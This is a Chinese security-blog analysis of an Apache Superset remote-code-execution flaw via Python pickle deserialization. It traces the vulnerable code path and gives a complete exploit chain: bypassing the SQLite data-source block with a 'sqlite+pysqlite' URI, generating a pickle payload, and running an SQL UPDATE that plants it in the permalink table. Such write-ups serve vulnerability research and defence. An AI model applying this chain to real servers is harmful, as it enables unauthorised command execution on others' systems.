# superset反序列化分析

> **来源**: https://forum.butian.net/share/2458  
> **文章ID**: 2458

---

前几天看到有公众号发布了Apache Superset的命令执行漏洞，涉及到python的反序列化，正好今天分析一下漏洞点的发现和漏洞利用过程

0x01 前置知识-python反序列化
====================

在python中，模块 [`pickle`](https://docs.python.org/zh-cn/3/library/pickle.html#module-pickle) 实现了对一个 Python 对象结构的二进制序列化和反序列化。和其他语言的反序列化一样，python里的 `pickle` 模块 **并不安全**。 你只应该对你信任的数据进行 unpickle 操作。构建恶意的 pickle 数据来**在解封时执行任意代码**是可能的。 绝对不要对不信任来源的数据和可能被篡改过的数据进行解封。（官方文档）

首先要说说`__reduce__()`这个魔术方法，这个方法用来表明**类的对象应当如何序列化**，当对象被Pickle(反序列化)时就会被调用。（和php中的`__wakeup()`类似）

`__reduce__()`方法不带任何参数，并且应返回字符串或最好返回一个**元组**（返回的对象通常称为“reduce 值”）。如果返回的是元组，则应当包含 2 到 6 个元素，这里主要关注前两个元素，

- 第一个元素代表一个**可调用对象**，该对象会在创建对象的最初版本时调用。
- 第二个元素代表可**调用对象的参数**，是一个元组。如果可调用对象不接受参数，必须提供一个空元组。

举个例子：

```python
import pickle
import os

class Student(object):
    name = 'xxx'
    age = '20'
    def __reduce__(self):
        cmd = "calc.exe"
        return os.system, (cmd,)

y = pickle.dumps(Student())
print(y)
pickle.loads(y)
```

![image-20230914145251743](images/f86684181277f2dc4643fdb8da1668214774e5ceccd91.jpg)

0x02 漏洞点发现
==========

首先全局搜索`pickle.loads`，该函数就是反序列化的地方，如果该参数可控，就可以造成远程命令执行

![image-20230918112303726](images/f988230129bdadb95877fbb55c8e81c53f5f4c83db7b3.jpg)

可以看到如果调用了`GetKeyValueCommand`中的`run`方法就会调用`get`，最后反序列化`entry.value`的内容进行反序列化，在`get`方法中是从数据库的`key_value`表中筛选`resource`和`key`值所得到的`value`值，写成sql语句的话类这样：

```php
select value from key_value where resource=xxx and key=xxx
```

那么就寻找哪里实例化了`GetKeyValueCommand`类并调用了`run`方法，并且传入的参数还是可控的

![image-20230918113106089](images/f161308b6f238b453cd3aff8d3bf2d4afb8d77d3f83c3.jpg)

经过筛查找到这样一处位置，传递的两个参数中`self.resource`是常量，值为`dashboard_permalink`，key为传递给`GetDashboardPermalinkCommand`的参数

![image-20230913183449039](images/f2017803cbfc9d9305330f9c1e9391f1e846427da71e3.jpg)

我们如法炮制找到实例化`GetDashboardPermalinkCommand`的地方，并且发现了触发这一条链的路由：`/dashboard/p/<key>/`

![image-20230918151952438](images/f24970474293dd66e6206f9b36cb1a67daf97e549a890.jpg)

既然这个功能是从数据库中取数据，那大概率有一个功能点是往数据库中写数据的地方，并且返回一个这样的路径，于是我们全局查找代码中出现`/dashboard/p/`的地方:

通过搜索找到这样一处，代码逻辑流程是访问`<pk>/permalink`路径，然后将pk参数和post传入的json合并后通过`CreateDashboardPermalinkCommand`生成key，最后拼接成上面的链接

![image-20230918152333524](images/f978329f04cd16165191a295d9562fb2932947baa6cc5.jpg)

通过查看注释可以知道这是一个保存固定链接（permanent link）的功能点

![image-20230920105114587](images/f60762432e2a57e98155dc4984fe2e649b641a0c8c6ea.jpg)

pk为当前dashboard的id，通过`CreateDashboardPermalinkCommand`的`run`方法获取固定链接的key值，我们继续更近run方法：

![image-20230913182630311](images/f191880206be19b6d9594d1930208f7573443feabf323.jpg)

这里的value将`dashboardId`和`state`合并后，传入到下面的`UpsertKeyValueCommand`方法中，其中的key值时通过user\_id和value生成的uuid值，resource为`dashboard_permalink`

然后进入`UpsertKeyValueCommand`的run方法中，调用了`upsert`，然后其中会将value的值通过`pickle.dumps`序列化后存入数据库

![image-20230913182524476](images/f222039be2b00ab876b342152e522bee0d5fb404f6b8d.jpg)

然后通过key.id和salt生成一个固定链接

![image-20230913184718553](images/f524966956e6e4d6115a53734c4324cee5c4405f3caa5.jpg)

我们获取到这样一个固定链接:

```php
http://127.0.0.1:5000/superset/dashboard/p/x2WRlLjzXrB/
```

所以我们的攻击路径就是首选获取一个固定链接，在生成固定链接的同时会将数据写入到数据库，然后我们通过修改数据库中的内容为payload，在访问固定链接的时候会取数据库中的数据进行反序列化，进而造成RCE

0x03 漏洞利用
=========

点击右上角`···`-`Share`-`Copy permailink to clipboard`

![image-20230913174540088](images/f124936ad509376857b3457d4b9d18aa554438203c174.jpg)

它会发送一个以下请求包生成一个当前页面的固定链接

```php
POST /api/v1/dashboard/2/permalink HTTP/1.1
Host: 127.0.0.1:5000
Connection: close

{"urlParams":[],"dataMask":{},"activeTabs":[]}
```

![image-20230913175211295](images/f894608d19a6f6851f0d1f2f828f834f8725b2a8abb09.jpg)

我们获取到这样一个固定链接:

```php
http://127.0.0.1:5000/superset/dashboard/p/x2WRlLjzXrB/
```

所以我们如果要想在这里进行反序列化就需要修改数据库中`key_value`表中`dashboard_permalink`值，正好有一个功能SQL Lab可以执行sql语句，那么我们就可以通过update修改`dashboard_permalink`值为payload，然后打开固定链接就可以触发`pickle.loads`进行反序列化，从而导致RCE

![image-20230913185403759](images/f484374cfbcb5c32207784dabf9bd25f94e98e967a3d9.jpg)

但是不巧的是，这里执行的SQL语句只能执行SELECT

![image-20230913185633970](images/f23583572c47700a46ef45b7d3805977cd58c75c654c3.jpg)

而且在配置数据库的地方勾选`Allow DML`会提示`SQLiteDialect_pysqlite cannot be used as a data source for security reasons.`无法保存

![image-20230913185724113](images/f8322465001e587bc290cfcae6ce567a9edb25b935ab3.jpg)

于是我们可以重新添加一个数据源也为sqlite，然后将源指向同一个数据库，并且打开`Allow DML`，但是直接添加也会报错，因为`sqlite`在`uri.drivername`的黑名单里

![image-20230914110528216](images/f364176b9c183927d9a5b069bfc5f95bff2211ac20857.jpg)

但是依然可以通过方言和驱动程序名称的完整SQLAlchemy URI来绕过，pysqlite驱动程序支持SQLite数据库，例如：`sqlite+pysqlite:///D:/superset_2.1.0/superset.db`

> SQL方言（或者数据库方言）指的是用于访问数据库的结构化查询语言的变体，根据具体的数据库系统不同，也可能会支持不同的方言。简单而言，某种DBMS不只会支持SQL标准，而且还会有一些自己独有的语法。

![image-20230914110626354](images/f13016385c221aaadadf72fe50c482a424d89a7376a97.jpg)

之后在生成固定链接后就可以去Sql Lab去update修改`dashboard_permalink`值

以弹出计算器作为演示，将RCE类序列化后转换为hex输出

```python
import pickle
import os
from binascii import hexlify

class RCE:
    def __reduce__(self):
        return os.system, ('calc.exe',)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(hexlify(pickled).decode())

```

然后执行sq语句：

```sql
update key_value set value=X'636e740a73797374656d0a70300a285663616c632e6578650a70310a7470320a5270330a2e' where resource='dashboard_permalink';
```

![image-20230914140854110](images/f8145122cb595623908ad3e938751198c3c4e447698e3.jpg)

在数据库中也被成功修改

![image-20230914112822038](images/f339089a50404c1f0e6f8acce8ba8f758fb322d999248.jpg)

然后访问固定链接也可成功弹出计算器

![image-20230914113252332](images/f244007b2395558e6bbb0365214f18ff8f7f780b294a0.jpg)

0x04 总结
=======

整个攻击路径就是首先通过`sqlite+pysqlite://`来添加当前数据库并开启DML使其能允许使用非 SELECT 语句（例如 UPDATE、DELETE、CREATE 等）操作数据库，然后生成一个固定链接，然后通过sql语句的update更新`dashboard_permalink`的值，然后在访问该链接后，在获取value时会触发`pickle.loads()`方法去反序列化`dashboard_permalink`的值，而这里的value值已经在上一步中通过sql语句将其替换成了payload，最终造成任意命令执行，
